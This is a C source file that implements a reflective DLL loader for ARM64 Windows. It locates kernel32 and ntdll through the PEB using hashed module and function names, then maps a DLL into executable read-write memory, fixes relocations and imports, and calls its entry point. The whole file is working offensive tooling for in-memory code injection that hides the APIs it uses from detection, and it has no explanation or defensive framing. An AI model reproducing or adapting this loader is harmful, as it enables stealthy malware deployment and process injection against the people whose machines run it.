#include "arm64_reflective_loader.h"

__declspec(noinline) ULONG_PTR GetIp(VOID)
{
    return (ULONG_PTR)_ReturnAddress();
}

DLLEXPORT ULONG_PTR WINAPI ReflectiveLoader(LPVOID lpLoaderParameter)
{
    LOADLIBRARYA_FN fnLoadLibraryA = NULL;
    GETPROCADDRESS_FN fnGetProcAddress = NULL;
    VIRTUALALLOC_FN fnVirtualAlloc = NULL;
    NTFLUSHINSTRUCTIONCACHE_FN fnNtFlushInstructionCache = NULL;

    ULONG_PTR uiDllBase;
    ULONG_PTR uiPeb;
    ULONG_PTR uiKernel32Base = 0;
    ULONG_PTR uiNtdllBase = 0;

    uiDllBase = GetIp();

    while (TRUE)
    {
        if (((PIMAGE_DOS_HEADER)uiDllBase)->e_magic == IMAGE_DOS_SIGNATURE)
        {
            ULONG_PTR uiHeader = uiDllBase + ((PIMAGE_DOS_HEADER)uiDllBase)->e_lfanew;
            if (((PIMAGE_NT_HEADERS)uiHeader)->Signature == IMAGE_NT_SIGNATURE)
                break;
        }
        uiDllBase--;
    }

    uiPeb = __readx18qword(0x60);
    PPEB_LDR_DATA_LDR pLdr = ((PPEB_LDR)uiPeb)->Ldr;
    PLIST_ENTRY pModuleList = &(pLdr->InMemoryOrderModuleList);
    PLIST_ENTRY pCurrentEntry = pModuleList->Flink;

    while (pCurrentEntry != pModuleList)
    {
        PLDR_DATA_TABLE_ENTRY_LDR pEntry = (PLDR_DATA_TABLE_ENTRY_LDR)CONTAINING_RECORD(pCurrentEntry, LDR_DATA_TABLE_ENTRY_LDR, InMemoryOrderLinks);
        if (pEntry->BaseDllName.Length > 0 && pEntry->BaseDllName.Buffer != NULL)
        {
            DWORD dwModuleHash = 0;
            USHORT usCounter = pEntry->BaseDllName.Length;
            BYTE *pNameByte = (BYTE *)pEntry->BaseDllName.Buffer;

            do
            {
                dwModuleHash = ror_dword_loader(dwModuleHash);
                if (*pNameByte >= 'a' && *pNameByte <= 'z')
                {
                    dwModuleHash += (*pNameByte - 0x20);
                }
                else
                {
                    dwModuleHash += *pNameByte;
                }
                pNameByte++;
            } while (--usCounter);

            if (dwModuleHash == KERNEL32DLL_HASH)
            {
                uiKernel32Base = (ULONG_PTR)pEntry->DllBase;
            }
            else if (dwModuleHash == NTDLLDLL_HASH)
            {
                uiNtdllBase = (ULONG_PTR)pEntry->DllBase;
            }
        }
        if (uiKernel32Base && uiNtdllBase)
            break;
        pCurrentEntry = pCurrentEntry->Flink;
    }

    if (!uiKernel32Base || !uiNtdllBase)
        return 0;

    PIMAGE_NT_HEADERS pOldNtHeaders = (PIMAGE_NT_HEADERS)(uiDllBase + ((PIMAGE_DOS_HEADER)uiDllBase)->e_lfanew);
    ULONG_PTR uiExportDir = uiKernel32Base + ((PIMAGE_NT_HEADERS)(uiKernel32Base + ((PIMAGE_DOS_HEADER)uiKernel32Base)->e_lfanew))->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)uiExportDir;
    ULONG_PTR uiAddressOfNames = uiKernel32Base + pExportDirectory->AddressOfNames;
    ULONG_PTR uiAddressOfFunctions = uiKernel32Base + pExportDirectory->AddressOfFunctions;
    ULONG_PTR uiAddressOfNameOrdinals = uiKernel32Base + pExportDirectory->AddressOfNameOrdinals;

    for (DWORD i = 0; i < pExportDirectory->NumberOfNames; i++)
    {
        char *cName = (char *)(uiKernel32Base + ((DWORD *)uiAddressOfNames)[i]);
        DWORD dwHashVal = hash_string_loader(cName);
        if (dwHashVal == LOADLIBRARYA_HASH)
            fnLoadLibraryA = (LOADLIBRARYA_FN)(uiKernel32Base + ((DWORD *)uiAddressOfFunctions)[((WORD *)uiAddressOfNameOrdinals)[i]]);
        else if (dwHashVal == GETPROCADDRESS_HASH)
            fnGetProcAddress = (GETPROCADDRESS_FN)(uiKernel32Base + ((DWORD *)uiAddressOfFunctions)[((WORD *)uiAddressOfNameOrdinals)[i]]);
        else if (dwHashVal == VIRTUALALLOC_HASH)
            fnVirtualAlloc = (VIRTUALALLOC_FN)(uiKernel32Base + ((DWORD *)uiAddressOfFunctions)[((WORD *)uiAddressOfNameOrdinals)[i]]);
        if (fnLoadLibraryA && fnGetProcAddress && fnVirtualAlloc)
            break;
    }

    if (!fnLoadLibraryA || !fnGetProcAddress || !fnVirtualAlloc)
        return 0;

    uiExportDir = uiNtdllBase + ((PIMAGE_NT_HEADERS)(uiNtdllBase + ((PIMAGE_DOS_HEADER)uiNtdllBase)->e_lfanew))->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)uiExportDir;
    uiAddressOfNames = uiNtdllBase + pExportDirectory->AddressOfNames;
    uiAddressOfFunctions = uiNtdllBase + pExportDirectory->AddressOfFunctions;
    uiAddressOfNameOrdinals = uiNtdllBase + pExportDirectory->AddressOfNameOrdinals;

    for (DWORD i = 0; i < pExportDirectory->NumberOfNames; i++)
    {
        char *cName = (char *)(uiNtdllBase + ((DWORD *)uiAddressOfNames)[i]);
        if (hash_string_loader(cName) == NTFLUSHINSTRUCTIONCACHE_HASH)
        {
            fnNtFlushInstructionCache = (NTFLUSHINSTRUCTIONCACHE_FN)(uiNtdllBase + ((DWORD *)uiAddressOfFunctions)[((WORD *)uiAddressOfNameOrdinals)[i]]);
            break;
        }
    }

    if (!fnNtFlushInstructionCache)
        return 0;

    ULONG_PTR uiNewImageBase = (ULONG_PTR)fnVirtualAlloc(NULL, pOldNtHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!uiNewImageBase)
        return 0;

    for (DWORD i = 0; i < pOldNtHeaders->OptionalHeader.SizeOfHeaders; i++)
    {
        ((BYTE *)uiNewImageBase)[i] = ((BYTE *)uiDllBase)[i];
    }

    PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)((ULONG_PTR)&pOldNtHeaders->OptionalHeader + pOldNtHeaders->FileHeader.SizeOfOptionalHeader);
    for (WORD i = 0; i < pOldNtHeaders->FileHeader.NumberOfSections; i++)
    {
        for (DWORD j = 0; j < pSectionHeader[i].SizeOfRawData; j++)
        {
            ((BYTE *)(uiNewImageBase + pSectionHeader[i].VirtualAddress))[j] = ((BYTE *)(uiDllBase + pSectionHeader[i].PointerToRawData))[j];
        }
    }

    ULONG_PTR uiDelta = uiNewImageBase - pOldNtHeaders->OptionalHeader.ImageBase;
    PIMAGE_DATA_DIRECTORY pRelocationData = &pOldNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

    if (pRelocationData->Size > 0 && uiDelta != 0)
    {
        PIMAGE_BASE_RELOCATION pRelocBlock = (PIMAGE_BASE_RELOCATION)(uiNewImageBase + pRelocationData->VirtualAddress);
        while (pRelocBlock->VirtualAddress)
        {
            DWORD dwEntryCount = (pRelocBlock->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_RELOC_LDR);
            PIMAGE_RELOC_LDR pRelocEntry = (PIMAGE_RELOC_LDR)((ULONG_PTR)pRelocBlock + sizeof(IMAGE_BASE_RELOCATION));
            for (DWORD k = 0; k < dwEntryCount; k++)
            {
                if (pRelocEntry[k].type == IMAGE_REL_BASED_DIR64)
                {
                    *(ULONG_PTR *)(uiNewImageBase + pRelocBlock->VirtualAddress + pRelocEntry[k].offset) += uiDelta;
                }
            }
            pRelocBlock = (PIMAGE_BASE_RELOCATION)((ULONG_PTR)pRelocBlock + pRelocBlock->SizeOfBlock);
        }
    }

    PIMAGE_DATA_DIRECTORY pImportData = &pOldNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (pImportData->Size > 0)
    {
        PIMAGE_IMPORT_DESCRIPTOR pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)(uiNewImageBase + pImportData->VirtualAddress);
        while (pImportDesc->Name)
        {
            char *sModuleName = (char *)(uiNewImageBase + pImportDesc->Name);
            HINSTANCE hModule = fnLoadLibraryA(sModuleName);
            if (hModule)
            {
                PIMAGE_THUNK_DATA pOriginalFirstThunk = (PIMAGE_THUNK_DATA)(uiNewImageBase + pImportDesc->OriginalFirstThunk);
                PIMAGE_THUNK_DATA pFirstThunk = (PIMAGE_THUNK_DATA)(uiNewImageBase + pImportDesc->FirstThunk);
                if (!pOriginalFirstThunk)
                    pOriginalFirstThunk = pFirstThunk;

                while (pOriginalFirstThunk->u1.AddressOfData)
                {
                    FARPROC pfnImportedFunc;
                    if (IMAGE_SNAP_BY_ORDINAL(pOriginalFirstThunk->u1.Ordinal))
                    {
                        pfnImportedFunc = fnGetProcAddress(hModule, (LPCSTR)(pOriginalFirstThunk->u1.Ordinal & 0xFFFF));
                    }
                    else
                    {
                        PIMAGE_IMPORT_BY_NAME pImportByName = (PIMAGE_IMPORT_BY_NAME)(uiNewImageBase + pOriginalFirstThunk->u1.AddressOfData);
                        pfnImportedFunc = fnGetProcAddress(hModule, pImportByName->Name);
                    }
                    pFirstThunk->u1.Function = (ULONG_PTR)pfnImportedFunc;
                    pOriginalFirstThunk++;
                    pFirstThunk++;
                }
            }
            pImportDesc++;
        }
    }

    DLLMAIN_FN fnDllEntry = (DLLMAIN_FN)(uiNewImageBase + pOldNtHeaders->OptionalHeader.AddressOfEntryPoint);
    fnNtFlushInstructionCache((HANDLE)-1, NULL, 0);
    fnDllEntry((HINSTANCE)uiNewImageBase, DLL_PROCESS_ATTACH, lpLoaderParameter);

    return uiNewImageBase;
}